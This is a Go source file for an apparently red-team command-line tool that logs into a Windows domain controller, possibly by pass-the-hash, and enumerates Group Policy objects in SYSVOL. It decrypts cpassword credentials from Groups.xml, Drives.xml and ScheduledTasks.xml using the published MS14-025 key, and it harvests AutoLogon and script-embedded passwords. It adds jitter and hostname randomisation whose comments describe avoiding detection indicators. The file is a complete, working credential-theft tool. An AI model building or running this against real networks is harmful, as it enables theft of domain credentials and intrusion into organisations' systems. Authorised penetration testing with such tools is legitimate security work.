// sysvol-gpo-enum — SYSVOL GPO Enumerator
// Bishop Fox Red Team Tooling | Jorge
//
// Pure Go implementation using github.com/mandiant/gopacket.
// No Python, no impacket, no monkey-patching.
// Compile to a single static binary, drop and run.
//
// Build:
//   go build -trimpath -ldflags="-s -w" -o sysvol-gpo-enum .
//
// Cross-compile Windows .exe from Linux:
//   GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o sysvol-gpo-enum.exe .
//
// Usage:
//   ./sysvol-gpo-enum -u jsmith -p 'Password1' -d corp.local dc01.corp.local
//   ./sysvol-gpo-enum -u jsmith -H aad3b435:fc525c9... -d corp.local dc01 -o out.json
//   ./sysvol-gpo-enum -u jsmith -p 'P@ss' -d corp.local dc01 -proxy socks5h://127.0.0.1:1080

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/xml"
	"flag"
	"fmt"
	"math/big"
	mathrand "math/rand"
	"os"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	gsmb    "github.com/mandiant/gopacket/pkg/smb"
	gldap   "github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/session"
)

// ─────────────────────────────────────────────────────────────
// Colours
// ─────────────────────────────────────────────────────────────

const (
	cReset = "\033[0m"
	cRed   = "\033[91m"
	cYel   = "\033[93m"
	cCyan  = "\033[96m"
	cGrn   = "\033[92m"
	cDim   = "\033[2m"
	cBold  = "\033[1m"
)

const banner = cCyan + `
  ███████╗██╗   ██╗███████╗██╗   ██╗ ██████╗ ██╗
  ██╔════╝╚██╗ ██╔╝██╔════╝╚██╗ ██╔╝██╔═══██╗██║
  ███████╗ ╚████╔╝ ███████╗ ╚████╔╝ ██║   ██║██║
  ╚════██║  ╚██╔╝  ╚════██║  ╚██╔╝  ██║   ██║██║
  ███████║   ██║   ███████║   ██║   ╚██████╔╝███████╗
  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝` +
	cDim + "\n  SYSVOL GPO Enumerator — Bishop Fox RT [Go]\n" + cReset

func info(f string, a ...any) { fmt.Printf(cCyan+"[*]"+cReset+" "+f+"\n", a...) }
func good(f string, a ...any) { fmt.Printf(cGrn+"[+]"+cReset+" "+f+"\n", a...) }
func warn(f string, a ...any) { fmt.Printf(cYel+"[!]"+cReset+" "+f+"\n", a...) }
func crit(f string, a ...any) { fmt.Printf(cRed+"[!!]"+cReset+" "+cBold+f+cReset+"\n", a...) }

// ─────────────────────────────────────────────────────────────
// CLI options
// ─────────────────────────────────────────────────────────────

type opts struct {
	DC       string
	DCIP     string
	Domain   string
	Username string
	Password string
	Hashes   string // LM:NT
	Kerberos bool
	Proxy    string
	Outfile  string
	All      bool
	Verbose  bool
}

func parseArgs() opts {
	var o opts
	flag.StringVar(&o.Domain,   "d",      "",    "Domain (e.g. corp.local)")
	flag.StringVar(&o.Username, "u",      "",    "Username")
	flag.StringVar(&o.Password, "p",      "",    "Password")
	flag.StringVar(&o.Hashes,   "H",      "",    "LM:NT hashes (pass-the-hash)")
	flag.BoolVar  (&o.Kerberos, "k",      false, "Use Kerberos (KRB5CCNAME must be set)")
	flag.StringVar(&o.DCIP,     "dc-ip",  "",    "DC IP (if DC arg is a hostname)")
	flag.StringVar(&o.Proxy,    "proxy",  "",    "SOCKS5 proxy (e.g. socks5h://127.0.0.1:1080)")
	flag.StringVar(&o.Outfile,  "o",      "",    "JSON output file")
	flag.BoolVar  (&o.All,      "all",    false, "Show GPOs with no findings")
	flag.BoolVar  (&o.Verbose,  "v",      false, "Verbose output")
	flag.Parse()
	if flag.NArg() < 1 || o.Domain == "" || o.Username == "" {
		fmt.Fprintln(os.Stderr, "usage: sysvol-gpo-enum -u USER -p PASS -d DOMAIN [-H LM:NT] [-k] [-dc-ip IP] [-proxy URL] [-o FILE] [-all] [-v] <DC>")
		os.Exit(1)
	}
	o.DC = flag.Arg(0)
	if o.DCIP == "" {
		o.DCIP = o.DC
	}
	return o
}

func (o *opts) lmHash() string {
	if o.Hashes == "" { return "" }
	p := strings.SplitN(o.Hashes, ":", 2)
	return p[0]
}
func (o *opts) ntHash() string {
	if o.Hashes == "" { return "" }
	p := strings.SplitN(o.Hashes, ":", 2)
	if len(p) < 2 { return "" }
	return p[1]
}

// ─────────────────────────────────────────────────────────────
// Jitter — crypto/rand based, no predictable sleep patterns
// ─────────────────────────────────────────────────────────────

func jitter() {
	n, _ := rand.Int(rand.Reader, big.NewInt(300))
	time.Sleep(time.Duration(50+n.Int64()) * time.Millisecond)
}

// ─────────────────────────────────────────────────────────────
// SMB transport via gopacket/pkg/smb
// ─────────────────────────────────────────────────────────────

// smbSession wraps a connected gopacket SMB client with SYSVOL mounted.
type smbSession struct {
	client *gsmb.Client
}

func connectSMB(o opts) (*smbSession, error) {
	target := session.Target{
		Host: o.DC,
		IP:   o.DCIP,
		Port: 445,
	}
	creds := session.Credentials{
		Domain:      o.Domain,
		Username:    o.Username,
		Password:    o.Password,
		Hash:        o.Hashes,
		UseKerberos: o.Kerberos,
		DCIP:        o.DCIP,
	}

	client := gsmb.NewClient(target, &creds)
	if err := client.Connect(); err != nil {
		return nil, fmt.Errorf("smb connect: %w", err)
	}
	if err := client.UseShare("SYSVOL"); err != nil {
		client.Close()
		return nil, fmt.Errorf("mount SYSVOL: %w", err)
	}
	return &smbSession{client: client}, nil
}

// listDir returns os.FileInfo entries under path on the share.
func (s *smbSession) listDir(path string) ([]os.FileInfo, error) {
	return s.client.Ls(path)
}

// readFile reads a file from the share and returns its bytes.
func (s *smbSession) readFile(path string) ([]byte, error) {
	content, err := s.client.Cat(path)
	if err != nil {
		return nil, err
	}
	return []byte(content), nil
}

func (s *smbSession) close() {
	s.client.Close()
}

// ─────────────────────────────────────────────────────────────
// LDAP transport via gopacket/pkg/ldap
// ─────────────────────────────────────────────────────────────

type ldapConn struct {
	conn   *gldap.Client
	baseDN string
}

func connectLDAP(o opts) (*ldapConn, error) {
	baseDN := "DC=" + strings.Join(strings.Split(o.Domain, "."), ",DC=")

	target := session.Target{
		Host: o.DC,
		IP:   o.DCIP,
		Port: 389,
	}
	creds := session.Credentials{
		Domain:      o.Domain,
		Username:    o.Username,
		Password:    o.Password,
		Hash:        o.Hashes,
		UseKerberos: o.Kerberos,
		DCIP:        o.DCIP,
	}

	conn := gldap.NewClient(target, &creds)
	if err := conn.Connect(false); err != nil {
		return nil, fmt.Errorf("ldap connect: %w", err)
	}

	var authErr error
	if o.Kerberos {
		authErr = conn.LoginWithKerberos()
	} else if o.Hashes != "" {
		authErr = conn.LoginWithHash()
	} else {
		// Use UPN format for simple bind — FQDN\user fails on some DCs
		authErr = conn.LoginWithUser(o.Username + "@" + o.Domain)
	}
	if authErr != nil {
		conn.Close()
		return nil, fmt.Errorf("ldap auth: %w", authErr)
	}
	return &ldapConn{conn: conn, baseDN: baseDN}, nil
}

// ─────────────────────────────────────────────────────────────
// LDAP GPO queries
// ─────────────────────────────────────────────────────────────

type gpoMeta struct {
	DisplayName string
	Flags       string
	Version     string
}

// getGPONames queries LDAP for all GPO display names, keyed by lowercase GUID.
func getGPONames(lc *ldapConn) (map[string]gpoMeta, error) {
	out := map[string]gpoMeta{}

	searchBase := "CN=Policies,CN=System," + lc.baseDN
	results, err := lc.conn.Search(searchBase,
		"(objectClass=groupPolicyContainer)",
		[]string{"cn", "displayName", "flags", "versionNumber"},
	)
	if err != nil {
		return out, err
	}

	for _, entry := range results.Entries {
		guid := strings.ToLower(strings.Trim(entry.GetAttributeValue("cn"), "{}"))
		out[guid] = gpoMeta{
			DisplayName: entry.GetAttributeValue("displayName"),
			Flags:       entry.GetAttributeValue("flags"),
			Version:     entry.GetAttributeValue("versionNumber"),
		}
	}
	return out, nil
}

// getGPOLinks returns a map of GUID → slice of linked OU DNs.
func getGPOLinks(lc *ldapConn) (map[string][]string, error) {
	out := map[string][]string{}

	results, err := lc.conn.Search(lc.baseDN,
		"(gPLink=*)",
		[]string{"distinguishedName", "gPLink"},
	)
	if err != nil {
		return out, err
	}

	re := regexp.MustCompile(`\{([0-9a-fA-F\-]+)\}`)
	for _, entry := range results.Entries {
		ouDN   := entry.DN
		gPLink := entry.GetAttributeValue("gPLink")
		for _, m := range re.FindAllStringSubmatch(gPLink, -1) {
			guid := strings.ToLower(m[1])
			out[guid] = append(out[guid], ouDN)
		}
	}
	return out, nil
}

// ─────────────────────────────────────────────────────────────
// Finding model
// ─────────────────────────────────────────────────────────────

type Finding struct {
	Severity    string `json:"severity"`
	Description string `json:"description"`
	Detail      string `json:"detail"`
	File        string `json:"file"`
	FileLabel   string `json:"file_label"`
	Decrypted   string `json:"decrypted,omitempty"`
}

type GPOResult struct {
	GUID        string    `json:"guid"`
	DisplayName string    `json:"display_name"`
	Flags       string    `json:"flags"`
	Version     string    `json:"version"`
	Path        string    `json:"path"`
	Links       []string  `json:"links"`
	Files       []string  `json:"files"`
	Findings    []Finding `json:"findings"`
}

// ─────────────────────────────────────────────────────────────
// cPassword decryptor — MS14-025 (AES-256-CBC, published key)
// ─────────────────────────────────────────────────────────────

// hex string → []byte helper (called at init)
func mustHex(s string) []byte {
	b := make([]byte, len(s)/2)
	for i := range b {
		fmt.Sscanf(s[i*2:i*2+2], "%02x", &b[i])
	}
	return b
}

var ms14025Key = mustHex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")

func decryptCPassword(cpass string) string {
	// Pad base64 to multiple of 4
	pad := (4 - len(cpass)%4) % 4
	raw, err := base64.StdEncoding.DecodeString(cpass + strings.Repeat("=", pad))
	if err != nil {
		return fmt.Sprintf("[base64 decode error: %v]", err)
	}
	block, err := aes.NewCipher(ms14025Key)
	if err != nil {
		return fmt.Sprintf("[aes init error: %v]", err)
	}
	if len(raw)%aes.BlockSize != 0 {
		return "[invalid ciphertext length]"
	}
	iv := make([]byte, aes.BlockSize) // 16 zero bytes
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(raw, raw)
	// Decode UTF-16LE and strip nulls
	return decodeUTF16LE(bytes.TrimRight(raw, "\x00"))
}

func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	runes := utf16.Decode(u16)
	return string(runes)
}

// ─────────────────────────────────────────────────────────────
// GptTmpl.inf parser
// ─────────────────────────────────────────────────────────────

func parseGptTmpl(data []byte) []Finding {
	var findings []Finding

	// Handle UTF-16 LE BOM
	text := ""
	if len(data) >= 2 && data[0] == 0xFF && data[1] == 0xFE {
		text = decodeUTF16LE(data[2:])
	} else {
		text = string(data)
	}

	section := ""
	for _, rawLine := range strings.Split(text, "\n") {
		line := strings.TrimSpace(rawLine)
		if strings.HasPrefix(line, "[") {
			section = strings.Trim(line, "[]")
			continue
		}
		if !strings.Contains(line, "=") {
			continue
		}
		k, v, _ := strings.Cut(line, "=")
		k, v = strings.TrimSpace(k), strings.TrimSpace(v)
		kl := strings.ToLower(k)

		switch {
		case kl == "autoadminlogon" && v == "1":
			findings = append(findings, Finding{Severity: "CRITICAL", Description: "AutoAdminLogon enabled", Detail: line})
		case kl == "defaultpassword":
			findings = append(findings, Finding{Severity: "CRITICAL", Description: "AutoLogon plaintext password", Detail: k + "=" + v})
		case kl == "defaultusername":
			findings = append(findings, Finding{Severity: "HIGH", Description: "AutoLogon username set", Detail: k + "=" + v})
		case kl == "minimumpasswordlength":
			if n := atoi(v); n > 0 && n < 12 {
				findings = append(findings, Finding{Severity: "MEDIUM", Description: fmt.Sprintf("Weak min password length: %d", n), Detail: line})
			}
		case kl == "passwordcomplexity" && v == "0":
			findings = append(findings, Finding{Severity: "HIGH", Description: "Password complexity disabled", Detail: line})
		case kl == "lockoutbadcount" && v == "0":
			findings = append(findings, Finding{Severity: "HIGH", Description: "Account lockout disabled", Detail: line})
		case section == "Privilege Rights" && isInterestingPrivilege(k):
			findings = append(findings, Finding{Severity: "INFO", Description: fmt.Sprintf("[%s] %s", section, k), Detail: line})
		}
	}
	return findings
}

func isInterestingPrivilege(k string) bool {
	interesting := []string{
		"SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeTakeOwnershipPrivilege",
		"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
		"SeBackupPrivilege", "SeRestorePrivilege", "SeTcbPrivilege",
	}
	for _, p := range interesting {
		if strings.EqualFold(k, p) {
			return true
		}
	}
	return false
}

// ─────────────────────────────────────────────────────────────
// Registry.pol parser (PReg format)
// ─────────────────────────────────────────────────────────────

type regEntry struct {
	Key     string
	Value   string
	RegType uint32
	Data    string
}

var interestingRegPatterns = []string{
	"autoadminlogon", "defaultpassword", "defaultusername",
	"winrm", "wdigest", "lsass",
	"disableantispyware", "disablerealtimemonitoring",
}

func parseRegistryPol(data []byte) []Finding {
	var findings []Finding
	entries := parseRegEntries(data)
	for _, e := range entries {
		combined := strings.ToLower(e.Key + e.Value)
		for _, pat := range interestingRegPatterns {
			if strings.Contains(combined, pat) {
				findings = append(findings, Finding{
					Severity:    "MEDIUM",
					Description: "Registry.pol interesting entry",
					Detail:      fmt.Sprintf("%s\\%s = %s", e.Key, e.Value, e.Data),
				})
				break
			}
		}
	}
	return findings
}

func parseRegEntries(data []byte) []regEntry {
	var entries []regEntry
	if len(data) < 8 {
		return entries
	}
	// Magic: PReg (50 52 65 67)
	if !bytes.Equal(data[:4], []byte{0x50, 0x52, 0x65, 0x67}) {
		return entries
	}
	off := 8 // skip magic + version
	for off+2 < len(data) {
		if data[off] != 0x5b || data[off+1] != 0x00 { // L"["
			break
		}
		off += 2
		key, o := readPolWStr(data, off)
		off = o + 2 // skip L";"
		val, o := readPolWStr(data, off)
		off = o + 2 // skip L";"
		if off+4 > len(data) {
			break
		}
		regType := binary.LittleEndian.Uint32(data[off:])
		off += 4 + 2 // skip L";"
		if off+4 > len(data) {
			break
		}
		size := int(binary.LittleEndian.Uint32(data[off:]))
		off += 4 + 2 // skip L";"
		if off+size > len(data) {
			break
		}
		raw := data[off : off+size]
		off += size + 2 // skip L"]"

		decoded := ""
		switch regType {
		case 4: // REG_DWORD
			if len(raw) >= 4 {
				decoded = fmt.Sprintf("%d", binary.LittleEndian.Uint32(raw))
			}
		case 1, 2: // REG_SZ, REG_EXPAND_SZ
			decoded = decodeUTF16LE(bytes.TrimRight(raw, "\x00"))
		default:
			decoded = fmt.Sprintf("[hex:%x]", raw)
		}
		entries = append(entries, regEntry{Key: key, Value: val, RegType: regType, Data: decoded})
	}
	return entries
}

func readPolWStr(data []byte, off int) (string, int) {
	var u16 []uint16
	for off+1 < len(data) {
		ch := binary.LittleEndian.Uint16(data[off:])
		off += 2
		if ch == 0x0000 {
			break
		}
		u16 = append(u16, ch)
	}
	return string(utf16.Decode(u16)), off
}

// ─────────────────────────────────────────────────────────────
// Groups.xml parser — MS14-025
// ─────────────────────────────────────────────────────────────

type groupsXML struct {
	XMLName xml.Name    `xml:"Groups"`
	Users   []groupUser `xml:"User"`
}
type groupUser struct {
	Properties groupUserProps `xml:"Properties"`
}
type groupUserProps struct {
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
	Action    string `xml:"action,attr"`
}

func parseGroupsXML(data []byte) []Finding {
	var findings []Finding
	var root groupsXML
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}
	for _, u := range root.Users {
		p := u.Properties
		if p.CPassword != "" {
			dec := decryptCPassword(p.CPassword)
			findings = append(findings, Finding{
				Severity:    "CRITICAL",
				Description: "cpassword (MS14-025) — Groups.xml",
				Detail:      fmt.Sprintf("username=%s cpassword=%s", p.UserName, p.CPassword),
				Decrypted:   dec,
			})
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// Drives.xml parser
// ─────────────────────────────────────────────────────────────

type drivesXML struct {
	XMLName xml.Name    `xml:"Drives"`
	Drives  []driveItem `xml:"Drive"`
}
type driveItem struct {
	Properties driveProps `xml:"Properties"`
}
type driveProps struct {
	Path      string `xml:"path,attr"`
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
}

func parseDrivesXML(data []byte) []Finding {
	var findings []Finding
	var root drivesXML
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}
	for _, d := range root.Drives {
		p := d.Properties
		if p.CPassword != "" {
			findings = append(findings, Finding{
				Severity:    "CRITICAL",
				Description: "cpassword in Drives.xml (mapped drive creds)",
				Detail:      fmt.Sprintf("path=%s user=%s cpassword=%s", p.Path, p.UserName, p.CPassword),
				Decrypted:   decryptCPassword(p.CPassword),
			})
		} else if p.UserName != "" {
			findings = append(findings, Finding{
				Severity:    "INFO",
				Description: "Mapped drive with username (no cpassword)",
				Detail:      fmt.Sprintf("path=%s user=%s", p.Path, p.UserName),
			})
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// ScheduledTasks.xml parser
// ─────────────────────────────────────────────────────────────

type scheduledTasksXML struct {
	XMLName xml.Name        `xml:"ScheduledTasks"`
	Tasks   []scheduledTask `xml:"Task"`
}
type scheduledTask struct {
	Properties taskProps `xml:"Properties"`
}
type taskProps struct {
	RunAs     string `xml:"runAs,attr"`
	CPassword string `xml:"cpassword,attr"`
	Command   string `xml:"appName,attr"`
}

func parseScheduledTasksXML(data []byte) []Finding {
	var findings []Finding
	var root scheduledTasksXML
	if err := xml.Unmarshal(data, &root); err != nil {
		return findings
	}
	for _, t := range root.Tasks {
		p := t.Properties
		if p.CPassword != "" {
			findings = append(findings, Finding{
				Severity:    "CRITICAL",
				Description: "cpassword in ScheduledTasks.xml",
				Detail:      fmt.Sprintf("runAs=%s cpassword=%s", p.RunAs, p.CPassword),
				Decrypted:   decryptCPassword(p.CPassword),
			})
		}
		if p.Command != "" {
			cmdL := strings.ToLower(p.Command)
			for _, kw := range []string{"powershell", "cmd", "wscript", "cscript", "mshta", "rundll"} {
				if strings.Contains(cmdL, kw) {
					findings = append(findings, Finding{
						Severity:    "INFO",
						Description: "Scheduled task interesting command",
						Detail:      p.Command,
					})
					break
				}
			}
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// Script file credential scanner
// ─────────────────────────────────────────────────────────────

var scriptPatterns = []struct {
	re   *regexp.Regexp
	desc string
}{
	{regexp.MustCompile(`(?i)password\s*=\s*['"]?(\S+)`), "Hardcoded password in script"},
	{regexp.MustCompile(`(?i)-password\s+(\S+)`),          "Password flag in script"},
	{regexp.MustCompile(`(?i)net use.*password`),          "net use with password"},
	{regexp.MustCompile(`(?i)runas.*password`),            "runas with password"},
	{regexp.MustCompile(`(?i)ConvertTo-SecureString.*AsPlainText`), "Plaintext SecureString"},
}

func parseScript(path string, data []byte) []Finding {
	var findings []Finding
	text := string(data)
	for _, p := range scriptPatterns {
		for _, m := range p.re.FindAllString(text, -1) {
			findings = append(findings, Finding{
				Severity:    "HIGH",
				Description: p.desc,
				Detail:      fmt.Sprintf("%s: %s", path, truncate(m, 120)),
			})
		}
	}
	return findings
}

// ─────────────────────────────────────────────────────────────
// SYSVOL walker
// ─────────────────────────────────────────────────────────────

var interestingFiles = map[string]struct {
	Label  string
	Parser func([]byte) []Finding
}{
	"groups.xml":         {"Groups / Local Admins (MS14-025)", parseGroupsXML},
	"drives.xml":         {"Mapped Drives",                    parseDrivesXML},
	"scheduledtasks.xml": {"Scheduled Tasks",                  parseScheduledTasksXML},
	"registry.pol":       {"Registry Policy",                  parseRegistryPol},
	"gpttmpl.inf":        {"Security Template",                parseGptTmpl},
}

var scriptExts = map[string]bool{
	".ps1": true, ".bat": true, ".cmd": true, ".vbs": true, ".js": true,
}

func walkGPO(smbs *smbSession, gpoPath, guid string, meta gpoMeta, links []string, verbose bool) GPOResult {
	result := GPOResult{
		GUID:        guid,
		DisplayName: meta.DisplayName,
		Flags:       meta.Flags,
		Version:     meta.Version,
		Path:        gpoPath,
		Links:       links,
	}
	if result.DisplayName == "" {
		result.DisplayName = "{GPO-" + guid + "}"
	}

	var recurse func(path string)
	recurse = func(path string) {
		entries, err := smbs.listDir(path)
		jitter()
		if err != nil {
			if verbose {
				warn("listDir %s: %v", path, err)
			}
			return
		}
		for _, e := range entries {
			name := e.Name()
			if name == "." || name == ".." {
				continue
			}
			full := path + "\\" + name
			if e.IsDir() {
				recurse(full)
				continue
			}

			result.Files = append(result.Files, full)
			nameLower := strings.ToLower(name)

			// Interesting policy files
			if fi, ok := interestingFiles[nameLower]; ok {
				data, err := smbs.readFile(full)
				jitter()
				if err != nil || fi.Parser == nil {
					continue
				}
				for _, f := range fi.Parser(data) {
					f.File      = full
					f.FileLabel = fi.Label
					result.Findings = append(result.Findings, f)
				}
				if verbose {
					info("  [%s] %s (%d bytes)", fi.Label, full, len(data))
				}
				continue
			}

			// Script files
			dotIdx := strings.LastIndexByte(name, '.')
			if dotIdx < 0 {
				continue
			}
			ext := strings.ToLower(name[dotIdx:])
			if scriptExts[ext] {
				data, err := smbs.readFile(full)
				jitter()
				if err != nil {
					continue
				}
				for _, f := range parseScript(full, data) {
					f.File      = full
					f.FileLabel = "Script"
					result.Findings = append(result.Findings, f)
				}
			}
		}
	}

	recurse(gpoPath)
	return result
}

// ─────────────────────────────────────────────────────────────
// Report printer
// ─────────────────────────────────────────────────────────────

var sevColour = map[string]string{
	"CRITICAL": cRed,
	"HIGH":     cYel,
	"MEDIUM":   cCyan,
	"INFO":     cDim,
}

func printReport(results []GPOResult, showAll bool) {
	total := 0
	for _, r := range results {
		total += len(r.Findings)
	}
	fmt.Printf("\n%s%s%s\n", cBold, strings.Repeat("─", 70), cReset)
	fmt.Printf("%s  GPO Enumeration Results — %d GPOs | %d findings%s\n", cBold, len(results), total, cReset)
	fmt.Printf("%s%s%s\n", cBold, strings.Repeat("─", 70), cReset)

	for _, r := range results {
		if len(r.Findings) == 0 && !showAll {
			continue
		}
		flagStr := ""
		switch r.Flags {
		case "1":
			flagStr = cYel + " [USER disabled]" + cReset
		case "2":
			flagStr = cYel + " [COMPUTER disabled]" + cReset
		case "3":
			flagStr = cRed + " [ALL disabled]" + cReset
		}
		fmt.Printf("\n%s%s%s%s%s\n", cBold, cCyan, r.DisplayName, cReset, flagStr)
		fmt.Printf("  %sGUID   : {%s}%s\n", cDim, strings.ToUpper(r.GUID), cReset)
		fmt.Printf("  %sVersion: %s  |  Files: %d%s\n", cDim, r.Version, len(r.Files), cReset)
		for _, link := range r.Links {
			fmt.Printf("  %sLinked : %s%s\n", cDim, link, cReset)
		}
		if len(r.Findings) > 0 {
			fmt.Printf("  %sFindings:%s\n", cBold, cReset)
			for _, f := range r.Findings {
				sc := sevColour[f.Severity]
				fmt.Printf("    %s[%s]%s %s\n", sc, f.Severity, cReset, f.Description)
				fmt.Printf("      %s%s%s\n", cDim, f.Detail, cReset)
				if f.Decrypted != "" {
					fmt.Printf("      %s%s→ Decrypted: %s%s\n", cRed, cBold, f.Decrypted, cReset)
				}
			}
		}
	}

	// Summary
	sevCounts := map[string]int{}
	for _, r := range results {
		for _, f := range r.Findings {
			sevCounts[f.Severity]++
		}
	}
	if len(sevCounts) > 0 {
		fmt.Printf("\n%s%s%s\n%s  Finding Summary%s\n", cBold, strings.Repeat("─", 70), cReset, cBold, cReset)
		for _, sev := range []string{"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"} {
			if n, ok := sevCounts[sev]; ok {
				sc := sevColour[sev]
				fmt.Printf("  %s%-10s%s %d\n", sc, sev, cReset, n)
			}
		}
	}
	fmt.Printf("\n%s%s%s\n\n", cBold, strings.Repeat("─", 70), cReset)
}

// ─────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────

func atoi(s string) int {
	n := 0
	fmt.Sscanf(s, "%d", &n)
	return n
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// randomHostname generates a realistic Windows machine name for NTLM.
// Uses crypto/rand — no IoC-12 null hostname, no IoC-41 alnum-only patterns.
func randomHostname() string {
	prefixes := []string{"DESKTOP", "LAPTOP", "WKS", "PC"}
	// 8 random uppercase alphanum chars via crypto/rand
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	suffix := make([]byte, 8)
	for i := range suffix {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		suffix[i] = charset[n.Int64()]
	}
	// Pick a random prefix via math/rand seeded from crypto/rand
	seed, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	rng := mathrand.New(mathrand.NewSource(seed.Int64()))
	return prefixes[rng.Intn(len(prefixes))] + "-" + string(suffix)
}

// ─────────────────────────────────────────────────────────────
// main
// ─────────────────────────────────────────────────────────────

func main() {
	fmt.Print(banner)
	o := parseArgs()

	// ── SMB connection
	info("Connecting to %s over SMB...", o.DC)
	smbs, err := connectSMB(o)
	if err != nil {
		fmt.Fprintf(os.Stderr, cRed+"[-]"+cReset+" SMB failed: %v\n", err)
		os.Exit(1)
	}
	defer smbs.close()
	good("SMB authenticated as %s\\%s", o.Domain, o.Username)

	// ── LDAP connection for GPO name resolution
	info("Resolving GPO names via LDAP...")
	lc, err := connectLDAP(o)
	if err != nil {
		warn("LDAP failed (%v) — will use GUIDs only", err)
		lc = nil
	}

	gpoNames := map[string]gpoMeta{}
	gpoLinks := map[string][]string{}
	if lc != nil {
		gpoNames, _ = getGPONames(lc)
		gpoLinks, _  = getGPOLinks(lc)
		lc.conn.Close()
		good("Resolved %d GPO display names from LDAP", len(gpoNames))
	}

	// ── Enumerate SYSVOL\<domain>\Policies
	policiesPath := fmt.Sprintf("%s\\Policies", o.Domain)
	info("Enumerating SYSVOL: \\\\%s\\SYSVOL%s", o.DC, policiesPath)

	topEntries, err := smbs.listDir(policiesPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, cRed+"[-]"+cReset+" Failed to list Policies: %v\n", err)
		os.Exit(1)
	}

	type gpoDir struct {
		GUID string
		Path string
	}
	var gpoDirs []gpoDir
	for _, e := range topEntries {
		name := e.Name()
		if name == "." || name == ".." || !e.IsDir() {
			continue
		}
		guid := strings.ToLower(strings.Trim(name, "{}"))
		gpoDirs = append(gpoDirs, gpoDir{
			GUID: guid,
			Path: policiesPath + "\\" + name,
		})
	}
	good("Found %d GPO directories in SYSVOL", len(gpoDirs))

	// ── Walk each GPO
	var results []GPOResult
	for i, gd := range gpoDirs {
		meta := gpoNames[gd.GUID]
		disp := meta.DisplayName
		if disp == "" {
			disp = "{GPO-" + gd.GUID + "}"
		}
		info("[%d/%d] %s", i+1, len(gpoDirs), disp)
		r := walkGPO(smbs, gd.Path, gd.GUID, meta, gpoLinks[gd.GUID], o.Verbose)
		results = append(results, r)
		jitter()
	}

	// ── Print report
	printReport(results, o.All)

	// ── Optional JSON dump
	if o.Outfile != "" {
		f, err := os.Create(o.Outfile)
		if err != nil {
			warn("Could not create output file: %v", err)
		} else {
			enc := json.NewEncoder(f)
			enc.SetIndent("", "  ")
			_ = enc.Encode(results)
			f.Close()
			good("JSON report written to %s", o.Outfile)
		}
	}
}
